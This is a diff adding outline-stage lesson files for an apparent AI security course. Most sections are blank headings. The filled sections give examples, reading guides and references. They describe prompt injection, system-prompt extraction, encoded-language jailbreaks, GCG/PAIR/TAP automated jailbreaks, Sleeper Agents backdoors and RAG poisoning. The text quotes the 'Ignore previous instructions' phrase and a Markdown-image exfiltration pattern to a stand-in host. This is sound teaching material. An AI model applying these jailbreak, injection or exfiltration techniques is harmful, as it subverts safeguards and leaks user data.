@@ -1,0 +1,794 @@
+
+======== lessons/module-00/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Real-world examples
+
+- **Indirect prompt injection via retrieved content** (Greshake et al., 2023) is exactly the
+  collapsed boundary in our second DFD: untrusted web/email text enters the model's instruction
+  stream. Paper guide in Module 05.
+- **Excessive Agency** is its own category in the OWASP Top 10 for LLM Applications (LLM06) —
+  the industry's recognition that over-privileged agents are a first-class risk, i.e. the
+  privilege column of your threat model.
+- **The confused-deputy framing** predates AI by decades (Hardy, 1988) yet describes agent
+  attacks perfectly; part of why this course insists you learn the classical pattern.
+
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**Kai Greshake et al., "Not what you've signed up for: Compromising Real-World LLM-Integrated
+Applications with Indirect Prompt Injection" (2023).** *Why now:* it is the paper that turned the
+"data becomes instructions" boundary collapse into a documented, real-world attack class —
+exactly the boundary you drew in the second DFD. *What to read for this lesson:* the threat model
+and system diagrams (Sections 2–3); you do not need the specific payloads yet (Module 05).
+*What to notice:* their attacker capabilities are stated as *where they can place text*, not as
+special access — the confused-deputy shape. Full guide arrives with Module 05.
+
+
+## Further reading
+
+- Adam Shostack, *Threat Modeling: Designing for Security* — the canonical treatment of DFDs and
+  STRIDE. Read the "four questions" framing and the DFD chapter.
+- Norm Hardy, "The Confused Deputy" (1988) — two pages; read all of it.
+- OWASP Top 10 for LLM Applications (2025) — skim now for the category names (especially LLM01,
+  LLM06, LLM08); we map every one to a lab in `references/standards-map.md`.
+
+
+## What you should now be able to do
+
+======== lessons/module-01/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Real-world examples
+
+- **Capital One (2019)** — an SSRF reaching the cloud metadata endpoint contributed to a breach
+  of ~100M records. The exact primitive an agent `fetch_url` tool can recreate.
+- **event-stream / `ua-parser-js` / xz-utils** — supply-chain compromises via dependency
+  takeover and malicious releases; the non-AI ancestors of malicious model/adapter uploads.
+- **System-prompt leaks** across many deployed assistants — the "secret in context" problem;
+  built as a lab in Module 04.
+
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+No single paper this lesson — these are settled foundations. Instead, read the two authoritative
+references and note the AI mapping:
+
+- **OWASP Top 10 (web) A03:2021 – Injection** and **A10:2021 – SSRF.** Read the one-page
+  descriptions; map each to its LLM analog (LLM01 prompt injection; agent `fetch_url` SSRF).
+- **CWE-502: Deserialization of Untrusted Data** — the class behind pickle/model-checkpoint RCE
+  (Module 13). Read the summary and one example.
+
+
+## Further reading
+
+- PortSwigger Web Security Academy — SSRF and SQL-injection labs (free); the SSRF cloud-metadata
+  lab is directly relevant. External tool → fallback: our `mini_target.py` and Module 18's local
+  fake-metadata service reproduce the core lesson if the site is unavailable.
+- OWASP Cheat Sheet Series — Query Parameterization, SSRF Prevention.
+
+
+## What you should now be able to do
+
+======== lessons/module-02/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Real-world examples
+
+- **System-prompt extraction** from deployed assistants — the "instructions are just context"
+  fact in the wild; you build this in Module 04.
+- **Cross-lingual and encoded jailbreaks** — low-resource languages and base64/leetspeak
+  wrappers land OOD where refusal probability drops; mechanism = the coverage argument above.
+- **The *Instruction Hierarchy* work (OpenAI, 2024)** — an explicit attempt to *strengthen* the
+  prior via training; important precisely because it frames the hierarchy as something to be
+  trained, i.e. soft. Paper guide in Module 04.
+
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**Wallace et al., "The Instruction Hierarchy: Training LLMs to Prioritize Privileged
+Instructions" (OpenAI, 2024).** *Why now:* it is the clearest statement that the system/user/tool
+hierarchy is a *trained* prior, and an attempt to strengthen it — the exact "soft, not enforced"
+theme of this lesson. *What to read:* the threat model and the definition of the hierarchy
+(intro + method); skim the training details. *What to notice:* even the paper's own results
+report *rates* of adherence, not guarantees — proving the boundary is probabilistic. Full guide
+in Module 04.
+
+
+## Further reading
+
+- Anthropic / OpenAI model & safety documentation on refusal behavior and system prompts — read
+  for how vendors *describe* these as behaviors, not guarantees. (Distinguish DOCUMENTED vs
+  MARKETING; note where claims are about rates.)
+- Sibling course M15 (RLHF/DPO) — revisit *how* the preference training that produces refusal
+  actually updates the model, if the coverage argument feels hand-wavy.
+
+
+## What you should now be able to do
+
+======== lessons/module-02/lesson-02.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Real-world examples
+
+- **JSON-mode value abuse** — apps that trust `{"authorized": true}` or act on a URL/path field
+  without validation; ordinary injection/SSRF/IDOR with the model as the untrusted source.
+- **Streamed-output rendering** — live-rendering model Markdown so an `![](http://sink/?d=...)`
+  fires an outbound request before any output filter completes (exfiltration channel; M18).
+- **Over-broad tool exposure** — shipping a `run_shell`/`fetch_url` tool "for flexibility" grants
+  a capability the schema does nothing to constrain; the root of many agent incidents (Stage 7).
+
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+No single paper — this is engineering foundation. Read instead: your primary model provider's
+**function/tool-calling** and **structured-output** documentation, and their **content-filtering /
+moderation** documentation. *What to extract:* find the exact sentences stating what is
+guaranteed (shape, availability) vs what is explicitly the caller's responsibility (validation,
+authorization, safety of actions). Note where the docs say "you should validate" — that sentence
+is the boundary this lesson is about. (Distinguish DOCUMENTED guarantee vs recommended practice.)
+
+
+## Further reading
+
+- JSON Schema specification (validation keywords) — to know exactly what shape constraints can and
+  cannot express (they cannot express "not an SSRF payload").
+- OWASP LLM Top 10: **LLM05 Improper Output Handling** and **LLM06 Excessive Agency** — the
+  standardized names for the two failure modes in this lesson; mapped in `references/standards-map.md`.
+
+
+## What you should now be able to do
+
+======== lessons/module-04/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Real-world examples
+
+- **System-prompt leaks** across many shipped assistants — the exact Lab-04 scenario; secrets and
+  instructions live in context and can be talked out.
+- **"Ignore previous instructions" defacements** of LLM-backed bots on social platforms — direct
+  injection via the user channel with authority framing.
+- **Encoded/low-resource-language jailbreaks** reported in the literature — the coverage lever;
+  bridges to Stage 3.
+
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**Wallace et al., "The Instruction Hierarchy: Training LLMs to Prioritize Privileged
+Instructions" (OpenAI, 2024).** *Why:* it formalizes the exact boundary you are attacking and
+proposes *training* to strengthen it — i.e. raising $\beta_{\text{sys}} - \beta_{\text{user}}$
+and $G$. *Read:* the taxonomy of injection types and the definition of aligned vs misaligned
+instructions; the evaluation (note results are *rates*). *Reproduce (light):* pick two of their
+attack categories and add a payload of each to your Lab-04 suite; compare ASR before/after your
+defenses. *Limitation to note:* training raises the bias but does not make it infinite — the gap
+you exploited remains, smaller.
+
+**Also foundational:** Perez & Ribeiro, "Ignore Previous Prompt: Attack Techniques for Language
+Models" (2022) — the paper that named the canonical direct-injection move. Skim for the technique
+catalog.
+
+
+## Further reading
+
+- OWASP LLM Top 10 — **LLM01 Prompt Injection** and **LLM07 System Prompt Leakage**; mapped in
+  [`references/standards-map.md`](../../references/standards-map.md).
+- Simon Willison's writing on prompt injection — accessible framing of *why* there is no clean
+  fix (the 02.1 "no parameterization" point). Treat as commentary, not a defense spec.
+
+
+## What you should now be able to do
+
+======== lessons/module-05/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**Greshake et al., "Not what you've signed up for: Compromising Real-World LLM-Integrated
+Applications with Indirect Prompt Injection" (2023).** *Why:* the paper that established indirect
+injection as a real, general attack class against deployed apps — the exact chain you built.
+*Read:* the threat model and taxonomy of injection delivery (retrieval, web, tools) and the
+"injection as remote code-ish execution" framing; the demos are illustrative. *Reproduce (light):*
+map two of their scenarios (e.g. retrieval-based and web-based) onto your Lab-05 suite and note
+which of your three defenses would have stopped each. *Limitation to note:* their world predates
+today's stronger instruction-hierarchy training — the ASR is lower now, but (per 04.1's paper)
+the finite-bias gap remains, so the chain still works with stronger framing.
+
+
+## Further reading
+
+- OWASP LLM Top 10 — **LLM01 Prompt Injection** (indirect subtype) and **LLM06 Excessive Agency**
+  (why the deputy's privilege is the fix); [`references/standards-map.md`](../../references/standards-map.md).
+- NIST AI 100-2 — "abuse" / integrity violations via poisoned inputs; taxonomy alignment.
+- Preview: Module 14 (RAG poisoning) turns "the attacker planted a doc" into "the attacker made
+  their doc get *retrieved*" — the retrieval-manipulation half of this attack.
+
+
+## What you should now be able to do
+
+======== lessons/module-06/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**Bagdasaryan et al., "(Ab)using Images and Sounds for Indirect Instruction Injection in
+Multi-Modal LLMs" (2023).** *Why:* demonstrates injecting instructions through image/audio into
+multimodal models — the mechanism this lab abstracts. *Read:* the threat model and the
+image-blending method (concept, not the optimization details — those connect to Stage 4). *Note:*
+their attack perturbs pixels the model reads; our lab uses the OCR/metadata path — two doors to
+the same room. Reproduce (light): argue which of your Lab-06 defenses stop the metadata path but
+not a pixel-space perturbation (answer: provenance/scan don't; least privilege + no-secret do).
+
+
+## Further reading
+
+- OWASP LLM Top 10 — LLM01 (multimodal subtype). Cross-agent risks appear in emerging Agentic AI
+  guidance; mapped in [`references/standards-map.md`](../../references/standards-map.md).
+- Preview: M20 (multimodal deep) covers pixel-space adversarial examples and steganography; M18
+  builds full cross-agent chains with tools.
+
+
+## What you should now be able to do
+
+======== lessons/module-07/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**Zou, Wang, Kolter, Fredrikson, "Universal and Transferable Adversarial Attacks on Aligned
+Language Models" (2023) — GCG.** *Why:* the paper you just reimplemented; defined automated,
+transferable LLM jailbreaks. *Read:* the objective (their affirmative-response target), the GCG
+algorithm (Alg. 1 — map each line to `gcg.py`), and the transfer results. *Reproduce:* you already
+did the core; extend by attacking an *ensemble* of two toy models to improve transfer (their
+universality trick). *Limitations / what changed:* perplexity filters (Jain et al.; Alon &
+Kamfonas, 2023) detect vanilla GCG; adaptive fluent methods (**AutoDAN**, Liu et al., 2023)
+restore evasion — the arms race you measured.
+
+
+## Further reading
+
+- Jain et al., "Baseline Defenses for Adversarial Attacks Against Aligned LMs" (2023) — perplexity
+  filtering, paraphrase, retokenization.
+- Chao et al., **PAIR**; Mehrotra et al., **TAP** — black-box, query-only jailbreaks (Module 08).
+- OWASP LLM01; MITRE ATLAS evasion techniques — [`references/standards-map.md`](../../references/standards-map.md).
+
+
+## What you should now be able to do
+
+======== lessons/module-08/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**Chao et al., "Jailbreaking Black Box Large Language Models in Twenty Queries" (PAIR, 2023)** and
+**Mehrotra et al., "Tree of Attacks: Jailbreaking Black-Box LLMs Automatically" (TAP, 2023).*
+*Why:* the canonical automated black-box jailbreaks — an attacker LLM + judge + (tree) search, the
+loop you built. *Read (PAIR):* the algorithm and the attacker/judge prompts; note the ~20-query
+efficiency claim and how refinement uses the target's refusal. *Read (TAP):* the tree-search +
+pruning improvement. *Reproduce (light):* map your beam search to PAIR's chain and add a pruning
+step (drop compositions below a judge threshold early) to approximate TAP; compare queries. *Limit:*
+efficiency depends heavily on judge quality and attacker capability — weak judge, weak attack.
+
+
+## Further reading
+
+- Liu et al., **AutoDAN** (2023) — fluent automated jailbreaks (bridges to Lab 07's adaptive
+  fluency). 
+- OWASP LLM01; MITRE ATLAS (evasion, automated attack generation) —
+  [`references/standards-map.md`](../../references/standards-map.md).
+
+
+## What you should now be able to do
+
+======== lessons/module-09/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**Goodfellow, Shlens, Szegedy, "Explaining and Harnessing Adversarial Examples" (2015)** and
+**Madry et al., "Towards Deep Learning Models Resistant to Adversarial Attacks" (2018).** *Why:*
+FGSM and the PGD/adversarial-training framework — the two papers you just implemented. *Read
+(Goodfellow):* the linear explanation of adversarial examples and FGSM. *Read (Madry):* the
+min–max formulation, PGD as the "ultimate first-order adversary", and the robustness results.
+*Reproduce:* you have the core; extend by reproducing their observation that adversarial training's
+robustness is threat-model-specific (test a model trained at $\ell_\infty$ against an $\ell_2$
+attack). *Limitation/what changed:* empirical robustness ≠ certified (Module 10); AutoAttack (Croce
+& Hein) later exposed many "robust" models as gradient-masked — evaluation rigor matters.
+
+
+## Further reading
+
+- Croce & Hein, **AutoAttack** (2020) — the standard robustness-evaluation ensemble (Module 10).
+- NIST AI 100-2 — evasion attacks taxonomy; [`references/standards-map.md`](../../references/standards-map.md).
+
+
+## What you should now be able to do
+
+======== lessons/module-10/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**Carlini & Wagner, "Towards Evaluating the Robustness of Neural Networks" (2017)**; **Cohen,
+Rosenfeld, Kolter, "Certified Adversarial Robustness via Randomized Smoothing" (2019)**; **Croce &
+Hein, "AutoAttack" (2020).** *Why:* CW = the strong optimization attack you implemented; Cohen = the
+certificate you implemented; AutoAttack = how to evaluate empirically without fooling yourself.
+*Read:* CW §III (objective + the change-of-variable box constraint); Cohen §3 (the radius theorem);
+AutoAttack §1–3 (why single attacks mislead). *Reproduce:* you have CW and smoothing; add one
+AutoAttack component (Square attack — a black-box query attack) and compare to PGD. *Limits:*
+smoothing certifies only $\ell_2$; CW is $\ell_2$-oriented; certified accuracy lags clean accuracy.
+
+
+## Further reading
+
+- Papernot et al. on transferability; Tramèr et al. on ensemble adversarial training.
+- NIST AI 100-2 evasion taxonomy; [`references/standards-map.md`](../../references/standards-map.md).
+
+
+## What you should now be able to do
+
+======== lessons/module-11/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**Gu, Dolan-Gavitt, Garg, "BadNets" (2017)** and **Hubinger et al., "Sleeper Agents: Training
+Deceptive LLMs that Persist Through Safety Training" (2024).** *Why:* BadNets = the backdoor recipe
+you implemented; Sleeper Agents = the LLM-scale, safety-training-resistant version and the reason
+this is a first-order concern. *Read (BadNets):* the threat model and trigger/target construction.
+*Read (Sleeper Agents):* the finding that standard safety training (SFT/RLHF/adversarial training)
+**fails to remove** a robust backdoor, and larger models hide it better. *Reproduce (light):* your
+lab is the BadNets core; add the Sleeper-Agents observation by "safety fine-tuning" your poisoned
+model on clean data (Exercise 4) and showing residual ASR. *Limitation:* toy scale; real triggers
+can be far subtler (Tran et al. detection; and detection remains an open problem).
+
+
+## Further reading
+
+- Tran, Li, Madry, "Spectral Signatures in Backdoor Attacks" (2018) — the detector you built.
+- OWASP LLM04 (Data & Model Poisoning); MITRE ATLAS poisoning techniques;
+  [`references/standards-map.md`](../../references/standards-map.md).
+- Forward link: M13 (malicious adapters/checkpoints), M22 (AI supply chain).
+
+
+## What you should now be able to do
+
+======== lessons/module-12/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**Shokri et al., "Membership Inference Attacks Against ML Models" (2017)**; **Carlini et al.,
+"Membership Inference Attacks From First Principles" (LiRA, 2022)**; **Carlini et al., "Extracting
+Training Data from Large Language Models" (2021)**; **Abadi et al., "Deep Learning with Differential
+Privacy" (DP-SGD, 2016)**. *Why:* the four pillars — MI, the *right* way to do MI (LiRA), LLM
+memorization, and the principled defense. *Read:* Shokri (shadow-model setup); LiRA §3–4 (per-example
+likelihood ratio, TPR@low-FPR — the evaluation lesson); Carlini-2021 (verbatim extraction from LLMs);
+Abadi §3 (clipping + noise + accountant). *Reproduce:* LiRA (Exercise 2) and DP-SGD (the lab).
+*Limits:* toy scale; real LiRA needs many shadow models; DP accounting must be exact or the
+guarantee is void.
+
+
+## Further reading
+
+- Fredrikson et al., model inversion; Tramèr et al., model extraction.
+- OWASP LLM02 (Sensitive Information Disclosure); NIST AI 100-2 (privacy attacks);
+  [`references/standards-map.md`](../../references/standards-map.md).
+
+
+## What you should now be able to do
+
+======== lessons/module-13/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+No single canonical paper; read the authoritative sources and one incident writeup:
+- **safetensors** design docs and **`torch.load(weights_only=True)`** release notes — extract the
+  exact safety guarantee (format cannot execute code) vs a recommendation.
+- **CWE-502 (Deserialization of Untrusted Data)** — the class behind pickle RCE.
+- A model-hub **malicious-pickle** disclosure (e.g., reports of pickle-based malware on public model
+  hubs) — read for the real-world delivery: how a "model download" became code execution.
+*Reproduce (light):* the lab is the core; extend by scanning a `.pt` file's pickle opcodes
+(`pickletools.dis`) to *detect* a `REDUCE`/`GLOBAL` to a dangerous callable — and note why opcode
+scanning is a fragile filter vs the format guarantee.
+
+
+## Further reading
+
+- Hugging Face security docs on `trust_remote_code` and safetensors.
+- OWASP LLM03 (Supply Chain); MITRE ATLAS (ML supply-chain compromise); forward link M22 (AI supply
+  chain). [`references/standards-map.md`](../../references/standards-map.md).
+
+
+## What you should now be able to do
+
+======== lessons/module-14/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**Zou et al., "PoisonedRAG: Knowledge Poisoning Attacks to Retrieval-Augmented Generation of Large
+Language Models" (2024).** *Why:* formalizes the two-part RAG attack — craft a text that (1) is
+retrieved for a target query and (2) steers the answer — exactly the lab. *Read:* the attack
+formulation (retrieval condition + generation condition) and the black-box vs white-box variants.
+*Reproduce (light):* your lab is the black-box, term-overlap version; add the "generation condition"
+explicitly (a poison optimized to change the *answer*, not just leak). *Limits:* real retrievers use
+semantic embedders + rerankers; term-overlap stuffing is the crudest lever — the paper's optimized
+poisons transfer better and are stealthier.
+
+
+## Further reading
+
+- OWASP LLM08 (Vector & Embedding Weaknesses), LLM01 (indirect injection subtype);
+  [`references/standards-map.md`](../../references/standards-map.md).
+- HNSW paper (Malkov & Yashunin) for ANN structure; forward link M15 (multi-tenant retrieval leakage).
+
+
+## What you should now be able to do
+
+======== lessons/module-15/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+No single canonical paper — this is broken access control (OWASP A01) applied to RAG. Read instead:
+- **OWASP Top 10 A01:2021 — Broken Access Control** and **OWASP LLM Top 10 LLM02 (Sensitive
+  Information Disclosure) / LLM08 (Vector & Embedding Weaknesses)** — map the leak to the standard
+  category. *Extract:* the guidance that access control must be server-side, deny-by-default, and on
+  the authenticated subject.
+- A vendor RAG-security guide on **document-level / row-level security for retrieval** — note the
+  recommendation to pre-filter by identity, not post-filter.
+*Reproduce:* the lab is the core; add an automated CI test that asserts no query from tenant A ever
+returns a tenant-B doc (regression guard) — the practical deliverable a real team needs.
+
+
+## Further reading
+
+- Row-level security in vector DBs (per-namespace / metadata-filtered retrieval) — implementation
+  patterns. [`references/standards-map.md`](../../references/standards-map.md).
+- Back-link M14 (poisoning within scope); forward link M18 (agents retrieving across tools/tenants).
+
+
+## What you should now be able to do
+
+======== lessons/module-16/lesson-01.md
+
+## Why this matters
+
+## Learning objectives
+
+## Concept
+
+## Intuition
+
+## Technical explanation
+
+## Mathematics
+
+## Attack / Defense model
+
+## Code
+
+## Practical lab
+
+## Exercise
+
+## Research paper
+
+**OWASP "LLM06: Excessive Agency"** (LLM Top 10) and the emerging **OWASP Agentic AI / Agentic
+Threats** guidance. *Why:* the industry framing of the exact risk you built — too much capability,
+insufficient authorization/oversight. *Read:* the definition of excessive agency and the recommended
+mitigations (minimize functionality/permissions, require approval for high-impact actions, complete
+mediation). *Also:* Greshake et al. (M05) for how the injection *reaches* the agent. *Reproduce:* the
+lab is the executable version; map each OWASP mitigation to a `Policy` control and test it. *Limits:*
+real agents have many tools and long horizons — blast radius and approval fatigue are worse at scale.
+
+
+## Further reading
+
+- Capability-based security (object-capability model) — the principled framing of "authority = the
+  reference you hold". Maps directly to tool handles/policies. Deep-dive in M17.
+- MITRE ATLAS (execution, exfiltration via ML systems); [`references/standards-map.md`](../../references/standards-map.md).
+
+
+## What you should now be able to do
